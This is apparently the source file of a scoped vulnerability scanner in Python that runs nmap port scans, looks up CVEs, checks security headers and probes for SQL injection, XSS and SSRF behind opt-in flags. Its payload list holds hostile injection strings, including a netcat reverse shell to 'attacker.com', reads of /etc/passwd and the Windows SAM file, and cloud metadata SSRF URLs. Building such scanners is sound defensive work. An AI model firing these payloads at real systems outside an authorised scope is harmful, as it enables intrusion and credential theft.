import asyncio
import aiohttp
import socket
import ssl
import json
import hashlib
import base64
import time
import threading
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlencode

from vulnscanner.security import (
    ScopeError, require_target_in_scope, validate_ports, validate_targets,
    require_feature_enabled,
)


@dataclass
class Vulnerability:
    vuln_id: str
    name: str
    severity: str
    cvss_score: float
    description: str
    affected_component: str
    remediation: str
    cwe_id: Optional[str] = None
    cve_id: Optional[str] = None
    exploit_available: bool = False
    raw_data: Dict = field(default_factory=dict)
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class Target:
    host: str
    ports: List[int] = field(default_factory=list)
    protocols: List[str] = field(default_factory=lambda: ['tcp'])
    services: Dict[int, Dict] = field(default_factory=dict)
    os_info: Dict = field(default_factory=dict)
    credentials: Dict = field(default_factory=dict)


class ScannerEngine:
    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.results: List[Vulnerability] = []
        self.targets: List[Target] = []
        self.scan_active = False
        self.executor = ThreadPoolExecutor(max_workers=self.config.get('threads', 50))
        self.session = None
        self._lock = threading.Lock()
        self.payloads = self._load_payloads()
        
    def _load_payloads(self) -> Dict:
        return {
            'sqli': [
                "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
                "'", '"', "' AND '1'='1", "' AND '1'='2",
            ],
            'xss': ['<pen-xss-probe>', "\"'><pen-xss-probe>"],
            'traversal': [
                "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
                "..%252f..%252f..%252fetc/passwd", "/etc/passwd%00",
                "..%c0%af..%c0%af..%c0%afetc/passwd",
            ],
            'cmd_injection': [
                "; ls -la", "| ls -la", "&& ls -la", "$(ls -la)",
                "; ping -c 10 127.0.0.1", "| nc -e /bin/sh attacker.com 4444",
                "`id`", "$(whoami)", "; cat /etc/passwd",
                "| type C:\\Windows\\System32\\config\\SAM",
            ],
            'ssrf': [
                "http://127.0.0.1:22", "http://localhost:80/server-status",
                "http://169.254.169.254/latest/meta-data/",
                "http://[::1]:22", "file:///etc/passwd",
                "dict://127.0.0.1:6379/info", "gopher://127.0.0.1:70",
            ]
        }
        
    async def initialize(self):
        # Keep TLS certificate validation enabled and cap connection pressure.
        connector = aiohttp.TCPConnector(limit=30)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=float(self.config.get('timeout', 10))),
        )
        
    async def close(self):
        if self.session:
            await self.session.close()
        self.executor.shutdown(wait=True)

    def add_target(self, host: str, ports: List[int] = None):
        """Add only a target that is within the explicitly configured scope."""
        validate_targets([host])
        if '://' in host:
            raise ScopeError('ScannerEngine expects a hostname, IP address, or CIDR, not a URL')
        selected_ports = validate_ports(ports)
        if selected_ports is None:
            selected_ports = [21, 22, 25, 53, 80, 110, 139, 143, 443, 445,
                              465, 587, 993, 995, 1433, 1521, 2049, 3306,
                              3389, 5432, 5900, 6379, 8080, 8443]
        self.targets.append(Target(host=host.strip(), ports=selected_ports))
        
    def _generate_vuln_id(self, name: str, host: str) -> str:
        data = f"{name}:{host}:{time.time()}"
        return f"VULN-{hashlib.md5(data.encode()).hexdigest()[:12].upper()}"

    async def port_scan(self, target: Target) -> Dict[int, Dict]:
        require_target_in_scope(target.host)
        services = {}
        try:
            import nmap
            nm = nmap.PortScanner()
            port_spec = ','.join(str(port) for port in target.ports)
            nm.scan(hosts=target.host, ports=port_spec, arguments='-sT -sV --version-light -T2 --host-timeout 5m')
            
            for host in nm.all_hosts():
                for proto in nm[host].all_protocols():
                    for port in nm[host][proto].keys():
                        service_info = nm[host][proto][port]
                        services[port] = {
                            'state': service_info['state'],
                            'name': service_info.get('name', 'unknown'),
                            'product': service_info.get('product', ''),
                            'version': service_info.get('version', ''),
                            'cpe': service_info.get('cpe', '')
                        }
            
            target.services = services
        except Exception as e:
            print(f"[-] Port scan error: {e}")
            
        return services

    async def check_cve(self, cpe: str, product: str, version: str) -> List[Dict]:
        results = []
        if cpe:
            try:
                async with self.session.get(
                    f"https://services.nvd.nist.gov/rest/json/cves/2.0",
                    params={'cpeName': cpe}, allow_redirects=False
                ) as response:
                    if response.status == 200:
                        data = await response.json()
                        for item in data.get('vulnerabilities', [])[:10]:
                            cve = item['cve']
                            metrics = cve.get('metrics', {}).get('cvssMetricV31', [{}])
                            if metrics:
                                cvss_data = metrics[0].get('cvssData', {})
                                results.append({
                                    'id': cve['id'],
                                    'severity': cvss_data.get('baseSeverity', 'UNKNOWN'),
                                    'cvss': cvss_data.get('baseScore', 0),
                                    'description': cve.get('descriptions', [{}])[0].get('value', ''),
                                })
            except Exception:
                pass
        return results

    async def test_sqli(self, url: str) -> List[Vulnerability]:
        require_target_in_scope(url)
        require_feature_enabled('PEN_ENABLE_ACTIVE_TESTS', 'Active SQL injection probes')
        vulnerabilities = []
        for payload in self.payloads['sqli']:
            try:
                test_url = f"{url}{'&' if '?' in url else '?'}{urlencode({'id': payload})}"
                async with self.session.get(test_url, allow_redirects=False) as response:
                    content = await response.text()
                    errors = ["SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL", "syntax error"]
                    for err in errors:
                        if err.lower() in content.lower():
                            vulnerabilities.append(Vulnerability(
                                vuln_id=self._generate_vuln_id("SQLI", url),
                                name="SQL Injection",
                                severity="HIGH", cvss_score=7.5,
                                description="Database error correlated with a SQL injection probe; manual validation required",
                                affected_component=url,
                                remediation="Use parameterized queries",
                                cwe_id="CWE-89", exploit_available=False
                            ))
                            return vulnerabilities
            except Exception:
                continue
        return vulnerabilities

    async def test_xss(self, url: str) -> List[Vulnerability]:
        require_target_in_scope(url)
        require_feature_enabled('PEN_ENABLE_ACTIVE_TESTS', 'Active XSS reflection probes')
        vulnerabilities = []
        for payload in self.payloads['xss']:
            try:
                test_url = f"{url}{'&' if '?' in url else '?'}{urlencode({'input': payload})}"
                async with self.session.get(test_url, allow_redirects=False) as response:
                    content = await response.text()
                    if payload in content:
                        vulnerabilities.append(Vulnerability(
                            vuln_id=self._generate_vuln_id("XSS", url),
                            name="Unencoded HTML Reflection",
                            severity="MEDIUM", cvss_score=5.3,
                            description="An inert HTML marker was reflected; script execution has not been demonstrated",
                            affected_component=url,
                            remediation="Implement output encoding",
                            cwe_id="CWE-79", exploit_available=False
                        ))
                        break
            except Exception:
                continue
        return vulnerabilities

    async def check_security_headers(self, url: str) -> List[Vulnerability]:
        require_target_in_scope(url)
        vulnerabilities = []
        required = {
            'X-Frame-Options': 'HIGH', 'X-Content-Type-Options': 'MEDIUM',
            'Strict-Transport-Security': 'HIGH', 'Content-Security-Policy': 'HIGH',
            'Referrer-Policy': 'LOW', 'Permissions-Policy': 'LOW'
        }
        try:
            async with self.session.get(url, allow_redirects=False) as response:
                headers = response.headers
                for header, severity in required.items():
                    if header not in headers:
                        vulnerabilities.append(Vulnerability(
                            vuln_id=self._generate_vuln_id(f"HEADER_{header}", url),
                            name=f"Missing Security Header: {header}",
                            severity=severity, cvss_score=5.0,
                            description=f"Missing {header}",
                            affected_component=url,
                            remediation=f"Add {header} header"
                        ))
        except Exception:
            pass
        return vulnerabilities

    async def test_ssrf(self, url: str) -> List[Vulnerability]:
        require_target_in_scope(url)
        require_feature_enabled('PEN_ENABLE_SSRF_PROBES', 'SSRF probes')
        vulnerabilities = []
        for payload in self.payloads['ssrf'][:3]:
            try:
                test_url = f"{url}{'&' if '?' in url else '?'}{urlencode({'url': payload})}"
                async with self.session.get(test_url, allow_redirects=False) as response:
                    content = await response.text()
                    indicators = ["SSH-", "ami-id", "root:", "Apache Status"]
                    if any(ind in content for ind in indicators):
                        vulnerabilities.append(Vulnerability(
                            vuln_id=self._generate_vuln_id("SSRF", url),
                            name="Server-Side Request Forgery",
                            severity="HIGH", cvss_score=8.6,
                            description="SSRF vulnerability",
                            affected_component=url,
                            remediation="Implement allowlist for URL fetching",
                            cwe_id="CWE-918"
                        ))
                        break
            except Exception:
                continue
        return vulnerabilities

    async def web_scan(self, target: Target, url: str) -> List[Vulnerability]:
        """Run passive checks by default; active checks require explicit opt-in."""
        require_target_in_scope(url)
        tasks = [self.check_security_headers(url)]
        if self.config.get('enable_active_tests'):
            require_feature_enabled('PEN_ENABLE_ACTIVE_TESTS', 'Active web checks')
            tasks.extend([self.test_sqli(url), self.test_xss(url)])
        results = await asyncio.gather(*tasks)
        return [vuln for result in results for vuln in result]

    async def service_scan(self, target: Target, port: int, service: Dict) -> List[Vulnerability]:
        require_target_in_scope(target.host)
        vulnerabilities = []
        service_name = service.get('name', '').lower()
        cpe = service.get('cpe', '')
        product = service.get('product', '')
        version = service.get('version', '')
        
        cve_results = await self.check_cve(cpe, product, version)
        for cve in cve_results:
            vulnerabilities.append(Vulnerability(
                vuln_id=self._generate_vuln_id(cve['id'], target.host),
                name=f"{cve['id']} - {service_name}",
                severity=cve['severity'], cvss_score=cve['cvss'],
                description=cve['description'],
                affected_component=f"{target.host}:{port}/{service_name}",
                remediation="Update to latest version",
                cve_id=cve['id'],
                exploit_available=False
            ))
        
        if service_name in ['http', 'https']:
            protocol = 'https' if service_name == 'https' else 'http'
            web_url = f"{protocol}://{target.host}:{port}"
            web_vulns = await self.web_scan(target, web_url)
            vulnerabilities.extend(web_vulns)
            
        return vulnerabilities

    async def run_full_scan(self) -> Dict[str, List[Vulnerability]]:
        if not self.targets:
            raise ScopeError('No targets have been configured')
        for target in self.targets:
            require_target_in_scope(target.host)
        await self.initialize()
        self.scan_active = True
        results = {}
        try:
            for target in self.targets:
                print(f"\n[*] Scanning target: {target.host}")
                services = await self.port_scan(target)
                all_vulns = []
                for port, service in services.items():
                    if service['state'] == 'open':
                        vulns = await self.service_scan(target, port, service)
                        all_vulns.extend(vulns)
                results[target.host] = all_vulns
                self.results.extend(all_vulns)
                print(f"[+] Found {len(all_vulns)} vulnerabilities")
            return results
        finally:
            self.scan_active = False
            await self.close()

    def export_results(self, output_path: str, fmt: str = 'json'):
        data = [{
            'vuln_id': v.vuln_id, 'name': v.name, 'severity': v.severity,
            'cvss_score': v.cvss_score, 'description': v.description,
            'affected_component': v.affected_component, 'remediation': v.remediation,
            'cwe_id': v.cwe_id, 'cve_id': v.cve_id, 'exploit_available': v.exploit_available,
            'timestamp': v.timestamp
        } for v in self.results]
        
        with open(output_path, 'w') as f:
            if fmt == 'json':
                json.dump(data, f, indent=2)
            else:
                import csv
                writer = csv.DictWriter(f, fieldnames=data[0].keys() if data else [])
                writer.writeheader()
                writer.writerows(data)
        print(f"[+] Results exported to {output_path}")
